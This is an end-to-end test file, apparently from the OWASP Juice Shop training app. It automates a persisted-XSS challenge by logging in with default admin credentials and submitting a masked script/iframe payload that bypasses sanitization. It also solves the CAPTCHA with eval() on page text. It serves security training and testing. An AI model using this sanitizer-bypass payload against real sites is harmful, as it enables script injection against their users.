/*
 * Copyright (c) 2014-2020 Bjoern Kimminich.
 * SPDX-License-Identifier: MIT
 */

const config = require('config')
const utils = require('../../lib/utils')
const pastebinLeakProduct = config.get('products').filter(product => product.keywordsForPastebinDataLeakChallenge)[0]

describe('/#/contact', () => {
  let comment, rating, submitButton, captcha, snackBar

  beforeEach(() => {
    browser.get(protractor.basePath + '/#/contact')
    comment = element(by.id('comment'))
    rating = $$('.br-unit').last()
    captcha = element(by.id('captchaControl'))
    submitButton = element(by.id('submitButton'))
    snackBar = element(by.css('.mat-simple-snackbar-action.ng-star-inserted')).element(by.css('.mat-focus-indicator.mat-button.mat-button-base'))
    solveNextCaptcha()
  })
  
  if (!utils.disableOnContainerEnv()) {
    describe('challenge "persistedXssFeedback"', () => {
      protractor.beforeEach.login({ email: 'admin@' + config.get('application.domain'), password: 'admin123' })

      it('should be possible to trick the sanitization with a masked XSS attack', () => {
        const EC = protractor.ExpectedConditions

        comment.sendKeys('<<script>Foo</script>iframe src="javascript:alert(`xss`)">')
        rating.click()

        submitButton.click()

        browser.sleep(5000)

        browser.waitForAngularEnabled(false)
        browser.get(protractor.basePath + '/#/about')

        browser.wait(EC.alertIsPresent(), 15000, "'xss' alert is not present on /#/about")
        browser.switchTo().alert().then(alert => {
          expect(alert.getText()).toEqual('xss')
          alert.accept()
        })

        browser.get(protractor.basePath + '/#/administration')
        browser.wait(EC.alertIsPresent(), 15000, "'xss' alert is not present on /#/administration")
        browser.switchTo().alert().then(alert => {
          expect(alert.getText()).toEqual('xss')
          alert.accept()
          $$('.mat-cell.mat-column-remove > button').last().click()
          browser.wait(EC.stalenessOf(element(by.tagName('iframe'))), 5000)
        })
        browser.waitForAngularEnabled(true)
      })

      protractor.expect.challengeSolved({ challenge: 'Server-side XSS Protection' })
    })
  }
  function solveNextCaptcha () {
    element(by.id('captcha')).getText().then((text) => {
      captcha.clear()
      const answer = eval(text).toString() // eslint-disable-line no-eval
      captcha.sendKeys(answer)
    })
  }
})